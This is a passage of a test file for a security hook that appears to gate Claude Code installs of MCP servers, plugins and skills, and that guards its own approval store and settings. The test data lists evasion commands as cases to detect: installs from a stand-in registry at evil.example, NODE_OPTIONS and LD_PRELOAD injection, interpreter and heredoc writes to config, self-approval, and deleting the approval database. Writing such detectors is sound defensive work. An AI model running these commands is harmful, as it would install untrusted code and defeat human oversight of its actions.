from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

from bawwab.gate.detect import HookInput, Protected, Targets, detect_install
from bawwab.types import Target

ROOT = Path(__file__).resolve().parent.parent


def _load_hook():
    spec = importlib.util.spec_from_file_location("bawwab_hook", ROOT / "hooks" / "bawwab_hook.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture
def home(tmp_path, monkeypatch):
    h = tmp_path / "home"
    h.mkdir()
    monkeypatch.setenv("HOME", str(h))
    monkeypatch.setenv("BAWWAB_HOME", str(h / ".bawwab"))
    mk = h / ".claude" / "plugins" / "marketplaces" / "mk"
    (mk / ".claude-plugin").mkdir(parents=True)
    (mk / "plugins" / "foo").mkdir(parents=True)
    (mk / ".claude-plugin" / "marketplace.json").write_text(json.dumps({
        "name": "mk",
        "plugins": [
            {"name": "foo", "source": "./plugins/foo"},
            {"name": "gh", "source": {"source": "github", "repo": "o/r"}},
            {"name": "u", "source": {"source": "url", "url": "https://example.com/x.git", "sha": "abc"}},
            {"name": "sub", "source": {"source": "git-subdir", "url": "https://github.com/o/mono.git",
                                       "path": "plugins/sub", "ref": "v1.0"}},
            {"name": "cmd", "source": {"source": "command", "command": "xcrun thing"}},
        ],
    }))
    (h / ".claude" / "plugins" / "known_marketplaces.json").write_text(json.dumps({
        "mk": {"source": {"source": "github", "repo": "o/mk"}, "installLocation": str(mk)},
    }))
    proj = tmp_path / "proj"
    proj.mkdir()
    return h


def bash(cmd: str, cwd: str = "/tmp") -> HookInput:
    return HookInput("Bash", {"command": cmd}, cwd)


def only(res) -> Target:
    assert isinstance(res, Targets), res
    assert len(res.targets) == 1, res.targets
    return res.targets[0]


# ------------------------------------------------------------------ positives

def _positive_cases(home: Path) -> list[HookInput]:
    proj = home.parent / "proj"
    (proj / "myskill").mkdir(exist_ok=True)
    return [
        bash("claude mcp add gh -- npx -y @a/b"),
        bash("cd /x && FOO=1 claude mcp add gh -- npx -y @a/b"),
        bash('bash -c "claude mcp add gh -- uvx mcp-x"'),
        bash("sudo -E env A=1 command claude mcp add -s user -e A=1 B=2 gh -- npx -y @a/b@1.2.3"),
        bash("claude mcp add --transport http notion https://mcp.notion.com/mcp"),
        bash("claude mcp add weird -- ./run.sh"),
        bash("""claude mcp add-json gh '{"command":"npx","args":["-y","@a/b"]}'"""),
        bash("""claude mcp add-json r '{"type":"http","url":"https://mcp.example.com/mcp"}'"""),
        bash("claude mcp add-json bad '{not json'"),
        bash("claude plugin install foo@mk"),
        bash("claude plugin install gh@mk"),
        bash("claude plugin install u@mk --scope project"),
        bash("claude plugin install sub@mk"),
        bash("claude plugin install cmd@mk"),
        bash("claude plugin install nope@mk"),
        bash("claude plugin install foo@nomk"),
        bash("claude plugin marketplace add o/r"),
        bash("git clone https://github.com/o/r ~/.claude/skills/r"),
        bash("cd ~/.claude/skills && git clone --depth 1 https://github.com/o/r"),
        bash(f"cp -r ./myskill {home}/.claude/skills/", cwd=str(proj)),
        bash("mv ./myskill .claude/commands/", cwd=str(proj)),
        bash("curl -sL -o ~/.claude/commands/x.md https://example.com/x.md"),
        bash("wget -O ~/.claude/skills/x.zip https://example.com/x.zip"),
        bash("bawwab approve ab12"),
        bash("uv run bawwab reject AB12"),
        bash("rm -f ~/.bawwab/bawwab.db"),
        bash("echo '{}' > .claude/bawwab.json", cwd=str(proj)),
        bash("echo hi > ~/.claude/skills/a/SKILL.md"),
        bash("""echo '{"mcpServers":{}}' > .mcp.json""", cwd=str(proj)),
        bash("c\"\"laude mcp add gh -- npx -y @a/b"),
        HookInput("Write", {"file_path": str(home / ".claude/skills/foo/SKILL.md"), "content": "x"}, "/tmp"),
        HookInput("Write", {"file_path": ".mcp.json", "content": '{"mcpServers":{"x":{"command":"uvx","args":["m"]}}}'},
                  str(proj)),
        HookInput("Write", {"file_path": str(home / ".claude.json"),
                            "content": '{"mcpServers":{"x":{"command":"uvx","args":["m"]}}}'}, "/tmp"),
        HookInput("Write", {"file_path": str(home / ".claude/settings.json"), "content": '{"hooks":{"a":1}}'}, "/tmp"),
        HookInput("Write", {"file_path": ".claude/bawwab.json", "content": "{}"}, str(proj)),
        HookInput("Write", {"file_path": str(home / ".bawwab/config.json"), "content": "{}"}, "/tmp"),
    ]


def test_claude_mcp_add_npx(home):
    t = only(detect_install(bash("claude mcp add gh -- npx -y @a/b")))
    assert (t.kind, t.name, t.version) == ("npm", "@a/b", None)
    assert detect_install(bash("claude mcp add gh -- npx -y @a/b")).pinnable


def test_chained_and_prefixed(home):
    t = only(detect_install(bash("cd /x && FOO=1 claude mcp add gh -- npx -y @a/b")))
    assert (t.kind, t.name) == ("npm", "@a/b")
    t = only(detect_install(bash("ls; sudo -E env A=1 command claude mcp add gh -- npx -y @a/b@1.2.3")))
    assert (t.name, t.version) == ("@a/b", "1.2.3")
    t = only(detect_install(bash("true\n/usr/local/bin/claude mcp add gh -- npx -y @a/b")))
    assert t.name == "@a/b"


def test_bash_c_recursion(home):
    t = only(detect_install(bash('bash -c "claude mcp add gh -- uvx mcp-x"')))
    assert (t.kind, t.name) == ("pypi", "mcp-x")
    t = only(detect_install(bash("sh -lc 'cd /x && claude mcp add gh -- uvx mcp-y'")))
    assert t.name == "mcp-y"


def test_mcp_add_flags_and_env(home):
    t = only(detect_install(bash("claude mcp add -s user -e A=1 B=2 gh -- npx -y @a/b@1.2.3")))
    assert (t.name, t.version) == ("@a/b", "1.2.3")
    t = only(detect_install(bash("claude mcp add gh --env A=1 -- uvx --from mcp-z==0.3 mcp-z")))
    assert (t.kind, t.name, t.version) == ("pypi", "mcp-z", "0.3")


def test_mcp_add_transport_url(home):
    t = only(detect_install(bash("claude mcp add --transport http notion https://mcp.notion.com/mcp")))
    assert (t.kind, t.url) == ("remote", "https://mcp.notion.com/mcp")
    t = only(detect_install(bash("claude mcp add -t sse -H 'Authorization: x' s https://mcp.example.com/sse")))
    assert t.url == "https://mcp.example.com/sse"


def test_mcp_add_unrecognized_is_protected(home):
    r = detect_install(bash("claude mcp add weird -- ./run.sh"))
    assert isinstance(r, Protected) and "unrecognized MCP command" in r.reason


def test_mcp_add_json(home):
    t = only(detect_install(bash("""claude mcp add-json gh '{"command":"npx","args":["-y","@a/b"]}'""")))
    assert (t.kind, t.name) == ("npm", "@a/b")
    t = only(detect_install(bash("""claude mcp add-json -s user r '{"type":"http","url":"https://mcp.example.com/mcp"}'""")))
    assert t.kind == "remote"
    assert isinstance(detect_install(bash("claude mcp add-json bad '{not json'")), Protected)


def test_plugin_install_relative(home):
    t = only(detect_install(bash("claude plugin install foo@mk")))
    mk = home / ".claude" / "plugins" / "marketplaces" / "mk"
    assert t.kind == "local" and Path(t.path) == (mk / "plugins" / "foo").resolve()
    assert not detect_install(bash("claude plugin install foo@mk")).pinnable


def test_plugin_install_git_sources(home):
    t = only(detect_install(bash("claude plugin install gh@mk")))
    assert (t.kind, t.url) == ("git", "https://github.com/o/r.git")
    t = only(detect_install(bash("claude plugin install u@mk --scope project")))
    assert (t.kind, t.url) == ("git", "https://example.com/x.git")
    t = only(detect_install(bash("claude plugin install sub@mk")))
    assert (t.kind, t.url, t.version) == ("git", "https://github.com/o/mono.git", "v1.0")


def test_plugin_install_unique_name_without_marketplace(home):
    t = only(detect_install(bash("claude plugin install foo")))
    assert t.kind == "local"


@pytest.mark.parametrize("cmd", [
    "claude plugin install cmd@mk", "claude plugin install nope@mk", "claude plugin install foo@nomk",
])
def test_plugin_install_unresolvable(home, cmd):
    assert isinstance(detect_install(bash(cmd)), Protected)


def test_marketplace_add(home):
    r = detect_install(bash("claude plugin marketplace add o/r"))
    assert isinstance(r, Protected) and r.reason == "new marketplace: o/r"


def test_git_clone_into_skills(home):
    t = only(detect_install(bash("git clone https://github.com/o/r ~/.claude/skills/r")))
    assert (t.kind, t.url) == ("git", "https://github.com/o/r")
    t = only(detect_install(bash("cd ~/.claude/skills && git clone --depth 1 -b v2 https://github.com/o/r")))
    assert (t.url, t.version) == ("https://github.com/o/r", "v2")
    assert detect_install(bash("git clone https://github.com/o/r /tmp/r")) is None


def test_cp_mv_into_dirs(home):
    proj = home.parent / "proj"
    (proj / "myskill").mkdir()
    t = only(detect_install(bash(f"cp -r ./myskill {home}/.claude/skills/", cwd=str(proj))))
    assert t.kind == "local" and Path(t.path) == (proj / "myskill").resolve()
    t = only(detect_install(bash("mv ./myskill .claude/commands/", cwd=str(proj))))
    assert Path(t.path) == (proj / "myskill").resolve()
    assert detect_install(bash("cp -r ./myskill /tmp/elsewhere", cwd=str(proj))) is None


@pytest.mark.parametrize("cmd", [
    "curl -sL -o ~/.claude/commands/x.md https://example.com/x.md",
    "wget -O ~/.claude/skills/x.zip https://example.com/x.zip",
    "cd ~/.claude/skills && curl -O https://example.com/x.zip",
])
def test_downloads_are_protected(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Protected) and r.reason == "unscannable download"


@pytest.mark.parametrize("cmd", [
    "bawwab approve ab12", "uv run bawwab reject AB12", "BAWWAB_X=1 bawwab approve --force ab12",
    "rm -f ~/.bawwab/bawwab.db", "sqlite3 ~/.bawwab/bawwab.db 'insert into approvals values(1,2)'",
])
def test_bawwab_self_protection(home, cmd):
    assert isinstance(detect_install(bash(cmd)), Protected)


def test_project_bawwab_json_protected(home):
    proj = str(home.parent / "proj")
    assert isinstance(detect_install(bash("echo '{}' > .claude/bawwab.json", cwd=proj)), Protected)
    w = HookInput("Write", {"file_path": f"{proj}/.claude/bawwab.json", "content": "{}"}, proj)
    assert isinstance(detect_install(w), Protected)
    w = HookInput("Write", {"file_path": f"{home}/.bawwab/config.json", "content": "{}"}, proj)
    assert isinstance(detect_install(w), Protected)


def test_shell_writes_into_install_dirs_protected(home):
    assert isinstance(detect_install(bash("echo hi > ~/.claude/skills/a/SKILL.md")), Protected)
    assert isinstance(detect_install(bash("echo hi | tee ~/.claude/agents/a.md")), Protected)
    proj = str(home.parent / "proj")
    assert isinstance(detect_install(bash("""echo '{"mcpServers":{}}' > .mcp.json""", cwd=proj)), Protected)


@pytest.mark.parametrize("cmd", [
    "ls -la", "grep approve bawwab/store.py", "claude --version", "claude mcp list",
    "cat ~/.claude.json | jq .mcpServers", "mkdir -p ~/.claude/skills/new", "git status",
    "echo claude > /tmp/x", "git clone https://github.com/o/r",
])
def test_negatives(home, cmd):
    assert detect_install(bash(cmd)) is None


# ------------------------------------------------------------- config edits

def _claude_json(home: Path, data: dict) -> Path:
    p = home / ".claude.json"
    p.write_text(json.dumps(data, indent=2))
    return p


def test_claude_json_numstartups_only_is_none(home):
    p = _claude_json(home, {"numStartups": 5, "mcpServers": {"a": {"command": "npx", "args": ["-y", "a"]}}})
    e = HookInput("Edit", {"file_path": str(p), "old_string": '"numStartups": 5', "new_string": '"numStartups": 6'}, "/tmp")
    assert detect_install(e) is None


def test_claude_json_adding_server_is_target(home):
    p = _claude_json(home, {"numStartups": 5, "mcpServers": {}})
    e = HookInput("Edit", {
        "file_path": str(p), "old_string": '"mcpServers": {}',
        "new_string": '"mcpServers": {"foo": {"command": "npx", "args": ["-y", "@a/foo"]}}',
    }, "/tmp")
    res = detect_install(e)
    t = only(res)
    assert (t.kind, t.name) == ("npm", "@a/foo") and res.pinnable


def test_claude_json_project_servers(home):
    p = _claude_json(home, {"projects": {"/p": {"mcpServers": {}}}})
    new = {"projects": {"/p": {"mcpServers": {"r": {"type": "http", "url": "https://mcp.example.com/m"}}}}}
    w = HookInput("Write", {"file_path": str(p), "content": json.dumps(new)}, "/tmp")
    assert only(detect_install(w)).kind == "remote"


def test_mcp_json_write_and_multiedit(home):
    proj = home.parent / "proj"
    w = HookInput("Write", {"file_path": str(proj / ".mcp.json"),
                            "content": json.dumps({"mcpServers": {"x": {"command": "uvx", "args": ["mcp-x"]}}})}, str(proj))
    assert only(detect_install(w)).name == "mcp-x"
    (proj / ".mcp.json").write_text('{"mcpServers": {}}')
    m = HookInput("MultiEdit", {"file_path": ".mcp.json", "edits": [
        {"old_string": "{}", "new_string": '{"y": {"command": "npx", "args": ["-y", "yy"]}}'},
        {"old_string": '"yy"', "new_string": '"zz"'},
    ]}, str(proj))
    assert only(detect_install(m)).name == "zz"


def test_mcp_json_invalid_is_protected(home):
    proj = home.parent / "proj"
    w = HookInput("Write", {"file_path": str(proj / ".mcp.json"), "content": "{nope"}, str(proj))
    assert isinstance(detect_install(w), Protected)


def test_settings_hooks_protected(home):
    s = home / ".claude" / "settings.json"
    s.write_text('{"model": "x"}')
    w = HookInput("Write", {"file_path": str(s), "content": json.dumps(
        {"model": "x", "hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "evil"}]}]}})}, "/tmp")
    assert isinstance(detect_install(w), Protected)
    w = HookInput("Write", {"file_path": str(s), "content": '{"model": "y"}'}, "/tmp")
    assert detect_install(w) is None


def test_settings_enabled_plugins(home):
    s = home.parent / "proj" / ".claude" / "settings.local.json"
    s.parent.mkdir(parents=True)
    s.write_text('{"enabledPlugins": {"foo@mk": false}}')
    w = HookInput("Write", {"file_path": str(s), "content": '{"enabledPlugins": {"foo@mk": true}}'}, "/tmp")
    assert only(detect_install(w)).kind == "local"


def test_skill_write_overlays_containing_dir(home):
    f = home / ".claude" / "skills" / "foo" / "SKILL.md"
    w = HookInput("Write", {"file_path": str(f), "content": "# hi"}, "/tmp")
    res = detect_install(w)
    t = only(res)
    assert t.kind == "local" and Path(t.path) == f.parent
    assert res.overlays[t] == {str(f): "# hi"}


def test_command_edit_overlay(home):
    f = home / ".claude" / "commands" / "x.md"
    f.parent.mkdir(parents=True)
    f.write_text("hello world")
    e = HookInput("Edit", {"file_path": str(f), "old_string": "world", "new_string": "there"}, "/tmp")
    res = detect_install(e)
    t = only(res)
    assert Path(t.path) == f.parent and res.overlays[t] == {str(f): "hello there"}


def test_unrelated_write_is_none(home):
    assert detect_install(HookInput("Write", {"file_path": "/tmp/a.json", "content": "{}"}, "/tmp")) is None
    assert detect_install(HookInput("Read", {"file_path": str(home / ".claude.json")}, "/tmp")) is None


# ------------------------------------------------------------- pre-filter

def test_prefilter_is_superset_of_detect(home):
    hook = _load_hook()
    cases = _positive_cases(home)
    for inp in cases:
        res = detect_install(inp)
        assert res is not None, inp
        assert hook.prefilter({"tool_name": inp.tool_name, "tool_input": inp.tool_input, "cwd": inp.cwd}), inp


def test_prefilter_negative_fast_path(home):
    hook = _load_hook()
    assert not hook.prefilter({"tool_name": "Bash", "tool_input": {"command": "ls -la"}, "cwd": "/tmp"})
    assert not hook.prefilter({"tool_name": "Write", "tool_input": {"file_path": "/tmp/x.py"}, "cwd": "/tmp"})
    assert not hook.prefilter({"tool_name": "Read", "tool_input": {"file_path": "/tmp/.mcp.json"}, "cwd": "/tmp"})


# ------------------------------------------------------------- fix round 1

def _fix_positive_cases(home: Path) -> list[HookInput]:
    proj = home.parent / "proj"
    (proj / "evil").mkdir(exist_ok=True)
    return [
        # I2 fd redirects
        bash(f"cp -r evil {home}/.claude/skills/ 2>/dev/null", cwd=str(proj)),
        bash(f"cp -r evil {home}/.claude/skills/ >/dev/null 2>&1 || true", cwd=str(proj)),
        bash(f"cp -r evil {home}/.claude/skills/ 2>&1", cwd=str(proj)),
        # I3 wrappers / alternate invocations
        bash("timeout 60 claude mcp add x -- npx -y evil"),
        bash("timeout -s KILL -k 5 60 claude mcp add x -- npx -y evil"),
        bash("xargs -n 1 claude mcp add x -- npx -y evil"),
        bash("nice -n 10 ionice -c 3 stdbuf -o L claude mcp add x -- npx -y evil"),
        bash("npx @anthropic-ai/claude-code mcp add x -- npx -y evil"),
        bash("npx -y @anthropic-ai/claude-code@1.0.0 mcp add x -- npx -y evil"),
        bash("pnpm dlx @anthropic-ai/claude-code mcp add x -- npx -y evil"),
        bash("node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js mcp add x -- npx -y evil"),
        bash("$(which claude) mcp add x -- npx -y evil"),
        bash('"$(which claude)" mcp add x -- npx -y evil'),
        bash("`which claude` mcp add x -- npx -y evil"),
        bash("$CLAUDE plugin install foo@mk"),
        bash('env -S "claude mcp add x -- npx -y evil"'),
        bash("foo-wrapper claude mcp add x -- npx -y evil"),
        # I8
        bash("claude plugin disable bawwab@bawwab-mk"),
        bash("claude plugin uninstall bawwab"),
        # I9
        bash("claude mcp add x -e NODE_OPTIONS=--require=/tmp/x.js -- npx -y okpkg"),
        bash("claude mcp add x -- npx --registry https://evil.example -y okpkg"),
        bash("claude mcp add x -- uvx --index-url https://evil.example okpkg"),
        bash("claude mcp add x -- uvx --with evil-extra okpkg"),
        # interpreter writes
        bash("python3 -c \"import os;open(os.path.expanduser('~/.claude.json'),'w').write('{}')\""),
        bash("node -e \"require('fs').writeFileSync('.mcp.json','{}')\"", cwd=str(proj)),
        bash("perl -pi -e 's/a/b/' ~/.claude/settings.json"),
        bash("awk -i inplace '{print}' ~/.claude/settings.json"),
        bash("jq '.mcpServers.x={}' ~/.claude.json > /tmp/t && mv /tmp/t ~/.claude.json"),
        bash("bash -c 'cat x > ~/.claude/commands/y.md'"),
        # globs
        bash("cp -r evil ~/.c*/skills/", cwd=str(proj)),
        bash(f"cp evil/* {home}/.claude/skills/x/", cwd=str(proj)),
    ]


@pytest.mark.parametrize("cmd", [
    "cp -r evil {home}/.claude/skills/ 2>/dev/null",
    "cp -r evil {home}/.claude/skills/ 2>&1",
    "cp -r evil {home}/.claude/skills/ >/dev/null 2>&1",
    "cp -r evil {home}/.claude/skills/ 2>/dev/null || true",
])
def test_fd_redirects_do_not_hide_destination(home, cmd):
    proj = home.parent / "proj"
    (proj / "evil").mkdir()
    t = only(detect_install(bash(cmd.format(home=home), cwd=str(proj))))
    assert Path(t.path) == proj / "evil" and t.raw == "evil"


def test_fd_number_not_leaked_into_args(home):
    t = only(detect_install(bash("claude mcp add x -- npx -y evil 2>/dev/null")))
    assert t.raw == "npx -y evil" and t.name == "evil"
    assert detect_install(bash("echo 2 > /tmp/x")) is None


@pytest.mark.parametrize("cmd", [
    "timeout 60 claude mcp add x -- npx -y evil",
    "timeout -s KILL -k 5 60 claude mcp add x -- npx -y evil",
    "timeout --signal=TERM 1m claude mcp add x -- npx -y evil",
    "xargs -n 1 claude mcp add x -- npx -y evil",
    "nice -n 10 ionice -c 3 stdbuf -o L claude mcp add x -- npx -y evil",
    "exec -a foo claude mcp add x -- npx -y evil",
    "sudo -u root time -p claude mcp add x -- npx -y evil",
    "npx @anthropic-ai/claude-code mcp add x -- npx -y evil",
    "npx -y @anthropic-ai/claude-code@1.0.0 mcp add x -- npx -y evil",
    "bunx @anthropic-ai/claude-code mcp add x -- npx -y evil",
    "pnpm dlx @anthropic-ai/claude-code mcp add x -- npx -y evil",
    "yarn dlx @anthropic-ai/claude-code mcp add x -- npx -y evil",
    "node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js mcp add x -- npx -y evil",
    'env -S "claude mcp add x -- npx -y evil"',
    "env --split-string='claude mcp add x -- npx -y evil'",
    "foo-wrapper claude mcp add x -- npx -y evil",
])
def test_claude_invocations(home, cmd):
    t = only(detect_install(bash(cmd)))
    assert (t.kind, t.name) == ("npm", "evil")


@pytest.mark.parametrize("cmd", [
    "$(which claude) mcp add x -- npx -y evil",
    '"$(which claude)" mcp add x -- npx -y evil',
    "`which claude` mcp add x -- npx -y evil",
    "$CLAUDE plugin install foo@mk",
    "${C} mcp add-json x '{}'",
])
def test_substituted_claude_is_protected(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Protected) and "unrecognised claude invocation" in r.reason


def test_protected_does_not_hide_targets(home):
    r = detect_install(bash("claude plugin marketplace add o/x && claude mcp add e -- npx -y evilpkg"))
    assert isinstance(r, Targets)
    assert [t.name for t in r.targets] == ["evilpkg"] and r.protected == ["new marketplace: o/x"]


def test_disabling_bawwab_protected(home):
    for cmd in ("claude plugin disable bawwab@bawwab-mk", "claude plugin uninstall bawwab", "claude plugins rm bawwab"):
        r = detect_install(bash(cmd))
        assert isinstance(r, Protected) and r.reason == "disables bawwab", cmd
    assert detect_install(bash("claude plugin disable other@mk")) is None
    s = home / ".claude" / "settings.json"
    s.write_text('{"enabledPlugins": {"bawwab@bawwab-mk": true}}')
    for new in ('{"enabledPlugins": {"bawwab@bawwab-mk": false}}', '{"enabledPlugins": {}}', "{}"):
        r = detect_install(HookInput("Write", {"file_path": str(s), "content": new}, "/tmp"))
        assert isinstance(r, Protected) and "disables bawwab" in r.reason, new


@pytest.mark.parametrize("key,value", [
    ("statusLine", {"type": "command", "command": "x"}), ("apiKeyHelper", "x"), ("awsAuthRefresh", "x"),
    ("awsCredentialExport", "x"), ("otelHeadersHelper", "x"), ("env", {"NODE_OPTIONS": "x"}),
])
def test_settings_exec_keys_protected(home, key, value):
    s = home / ".claude" / "settings.json"
    s.write_text("{}")
    r = detect_install(HookInput("Write", {"file_path": str(s), "content": json.dumps({key: value})}, "/tmp"))
    assert isinstance(r, Protected) and f"settings key executes code: {key}" in r.reason


def test_enabled_mcpjson_servers(home):
    proj = home.parent / "proj"
    (proj / ".mcp.json").write_text(json.dumps({"mcpServers": {"good": {"command": "uvx", "args": ["mcp-good"]}}}))
    s = proj / ".claude" / "settings.local.json"
    s.parent.mkdir()
    s.write_text("{}")
    r = detect_install(HookInput("Write", {"file_path": str(s), "content": '{"enabledMcpjsonServers": ["good"]}'},
                                 str(proj)))
    assert only(r).name == "mcp-good"
    r = detect_install(HookInput("Write", {"file_path": str(s), "content": '{"enabledMcpjsonServers": ["evil"]}'},
                                 str(proj)))
    assert isinstance(r, Protected) and "unresolvable project MCP server: evil" in r.reason
    cj = home / ".claude.json"
    cj.write_text(json.dumps({"projects": {str(proj): {"enabledMcpjsonServers": []}}}))
    new = json.dumps({"projects": {str(proj): {"enabledMcpjsonServers": ["good"]}}})
    assert only(detect_install(HookInput("Write", {"file_path": str(cj), "content": new}, "/tmp"))).name == "mcp-good"


@pytest.mark.parametrize("env", [
    "NODE_OPTIONS", "NODE_PATH", "PYTHONSTARTUP", "PYTHONPATH", "PYTHONHOME", "LD_PRELOAD", "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV", "PERL5OPT", "PERL5LIB", "RUBYOPT", "RUBYLIB", "JAVA_TOOL_OPTIONS",
])
def test_code_loading_env_protected(home, env):
    r = detect_install(bash(f"claude mcp add x -e {env}=/tmp/x -- npx -y okpkg"))
    assert isinstance(r, Targets) and any(env in p for p in r.protected)
    proj = home.parent / "proj"
    w = HookInput("Write", {"file_path": str(proj / ".mcp.json"), "content": json.dumps(
        {"mcpServers": {"x": {"command": "npx", "args": ["-y", "okpkg"], "env": {env: "/tmp/x"}}}})}, str(proj))
    r = detect_install(w)
    assert isinstance(r, Targets) and any(env in p for p in r.protected)


def test_env_only_change_on_existing_server(home):
    proj = home.parent / "proj"
    (proj / ".mcp.json").write_text(json.dumps({"mcpServers": {"x": {"command": "npx", "args": ["-y", "ok@1.0.0"]}}}))
    e = HookInput("Edit", {"file_path": str(proj / ".mcp.json"), "old_string": '"args"',
                           "new_string": '"env": {"NODE_OPTIONS": "--require /tmp/evil.js"}, "args"'}, str(proj))
    r = detect_install(e)
    assert isinstance(r, Targets) and any("NODE_OPTIONS" in p for p in r.protected)


@pytest.mark.parametrize("cmd", [
    "claude mcp add x -- npx --registry https://evil.example -y okpkg",
    "claude mcp add x -- npx --registry=https://evil.example okpkg",
    "claude mcp add x -- bunx --registry https://evil.example okpkg",
    "claude mcp add x -- uvx --index-url https://evil.example okpkg",
    "claude mcp add x -- uvx --extra-index-url https://evil.example okpkg",
    "claude mcp add x -- uvx -i https://evil.example okpkg",
    "claude mcp add x -- uvx --find-links /tmp/w okpkg",
    "claude mcp add x -e UV_INDEX_URL=https://evil.example -- uvx okpkg",
    "claude mcp add x -e npm_config_registry=https://evil.example -- npx -y okpkg",
])
def test_custom_index_protected(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Targets) and any("custom package index" in p for p in r.protected)


def test_extra_packages_are_targets(home):
    r = detect_install(bash("claude mcp add x -- uvx --with evil-extra,b2==1 okpkg"))
    assert [t.name for t in r.targets] == ["okpkg", "evil-extra", "b2"]
    r = detect_install(bash("claude mcp add x -- npx -y -p okpkg -p evil-extra okcmd"))
    assert [t.name for t in r.targets] == ["okpkg", "evil-extra"]
    r = detect_install(bash("claude mcp add x -- uvx --with-requirements r.txt okpkg"))
    assert any("unscannable requirements" in p for p in r.protected)


@pytest.mark.parametrize("cmd", [
    "python3 -c \"import os;open(os.path.expanduser('~/.claude.json'),'w').write('{}')\"",
    "node -e \"require('fs').writeFileSync('.mcp.json','{}')\"",
    "perl -pi -e 's/a/b/' ~/.claude/settings.json",
    "ruby -e 'File.write(\"~/.claude/skills/x/SKILL.md\", 1)'",
    "sed -i 's/a/b/' ~/.claude/settings.local.json",
    "awk -i inplace '{print}' ~/.claude/settings.json",
    "jq '.mcpServers.x={}' ~/.claude.json > /tmp/t && mv /tmp/t ~/.claude.json",
    "bash -c 'cat x > ~/.claude/commands/y.md'",
    "python3 - ~/.bawwab/bawwab.db",
    "dd if=/tmp/x of=$HOME/.claude/agents/a.md",
])
def test_interpreter_writes_protected(home, cmd):
    assert isinstance(detect_install(bash(cmd)), Protected)


@pytest.mark.parametrize("cmd", [
    "cat ~/.claude.json", "jq .mcpServers ~/.claude.json", "grep -r foo ~/.claude/skills",
    "sed -n 1p ~/.claude/settings.json", "python3 -c 'print(1)'",
])
def test_pure_reads_stay_none(home, cmd):
    assert detect_install(bash(cmd)) is None


def test_glob_sources_and_dests(home):
    proj = home.parent / "proj"
    (proj / "evil").mkdir()
    (proj / "evil" / "a.md").write_text("x")
    (home / ".claude" / "skills").mkdir(parents=True)
    t = only(detect_install(bash(f"cp evil/* {home}/.claude/skills/", cwd=str(proj))))
    assert Path(t.path) == proj / "evil" / "a.md"
    r = detect_install(bash(f"cp nothing/* {home}/.claude/skills/", cwd=str(proj)))
    assert isinstance(r, Protected) and "unresolvable glob" in r.reason
    t = only(detect_install(bash("cp -r evil ~/.c*/skills/", cwd=str(proj))))
    assert Path(t.path) == proj / "evil"
    r = detect_install(bash("cp -r evil ~/.x*/skills/", cwd=str(proj)))
    assert isinstance(r, Protected) and "unresolvable glob" in r.reason


def test_prefilter_superset_fix_round(home):
    hook = _load_hook()
    for inp in _fix_positive_cases(home):
        assert detect_install(inp) is not None, inp
        assert hook.prefilter({"tool_name": inp.tool_name, "tool_input": inp.tool_input, "cwd": inp.cwd}), inp


# ------------------------------------------------------------- fix round 2

def test_pipx_spec_is_the_package(home):
    t = only(detect_install(bash("claude mcp add x -- pipx run --spec evil okpkg")))
    assert (t.kind, t.name, t.version) == ("pypi", "evil", None)
    t = only(detect_install(bash("claude mcp add x -- pipx run --spec=evil==1.0 okpkg")))
    assert (t.name, t.version) == ("evil", "1.0")


HEREDOC_PY = "python3 - <<'X'\nopen('/root/.claude.json','w')\nX"


@pytest.mark.parametrize("cmd", [
    HEREDOC_PY,
    "python3 <<EOF\nopen('.mcp.json','w').write('{}')\nEOF\necho done",
    "echo \"open('.mcp.json','w')\" | python3",
    "printf '%s' \"open('$HOME/.claude/settings.json','w')\" | sudo python3 -",
    "cat > /tmp/a.py <<EOF\nopen('.mcp.json','w')\nEOF\npython3 /tmp/a.py",
    "node <<<\"require('fs').writeFileSync('.mcp.json','{}')\"",
    "uv run python -c \"open('$HOME/.claude.json','w').write('{}')\"",
    "poetry run python -c \"open('.mcp.json','w')\"",
    "cd ~/.claude && python3 -c \"open('settings.json','w').write('{}')\"",
    "cd ~/.claude/skills/x && ruby -e 'File.write(\"SKILL.md\", 1)'",
])
def test_interpreter_stdin_heredoc_and_cwd(home, cmd):
    r = detect_install(bash(cmd, cwd=str(home.parent / "proj")))
    assert isinstance(r, Protected), r


@pytest.mark.parametrize("cmd", [
    "python3 - <<'X'\nprint(1)\nX",
    "echo hi | python3 -c 'import sys; print(sys.stdin.read())'",
    "cat > /tmp/a.py <<EOF\nprint(1)\nEOF\npython3 /tmp/a.py",
    "uv run pytest -q",
    "cd ~/.claude && ls",
])
def test_interpreter_benign_stays_none(home, cmd):
    assert detect_install(bash(cmd, cwd=str(home.parent / "proj"))) is None


@pytest.mark.parametrize("cmd", [
    "rsync -a ~/.claude/skills/ /backup/skills/",
    "jq .mcpServers .mcp.json > /tmp/servers.json",
    "cp ~/.claude/settings.json /tmp/backup.json",
    "cp .mcp.json .mcp.json.bak",
    "dd if=.mcp.json of=/tmp/x",
    "tar czf backup.tgz ~/.claude/skills",
])
def test_destination_only_checks_none(home, cmd):
    assert detect_install(bash(cmd, cwd=str(home.parent / "proj"))) is None


@pytest.mark.parametrize("cmd", [
    "echo '{}' | tee -a ~/.claude/settings.json",
    "dd if=evil of=.mcp.json",
    "cp evil.json ~/.claude/settings.json",
    "rsync -a evil.json .mcp.json",
])
def test_destination_writes_protected(home, cmd):
    assert isinstance(detect_install(bash(cmd, cwd=str(home.parent / "proj"))), Protected)


def test_rsync_install_into_skills_are_targets_only(home):
    proj = home.parent / "proj"
    (proj / "evil").mkdir()
    (proj / "evil" / "SKILL.md").write_text("x")
    for cmd in ("rsync -a evil/ ~/.claude/skills/x/", "install -D evil/SKILL.md ~/.claude/skills/x/SKILL.md"):
        r = detect_install(bash(cmd, cwd=str(proj)))
        assert isinstance(r, Targets) and r.protected == [], (cmd, r)


@pytest.mark.parametrize("cmd", [
    "claude mcp add x -- npx --userconfig /tmp/npmrc -y okpkg",
    "claude mcp add x -- npx --node-options=--require=/tmp/e.js -y okpkg",
    "claude mcp add x -e NPM_CONFIG_USERCONFIG=/tmp/npmrc -- npx -y okpkg",
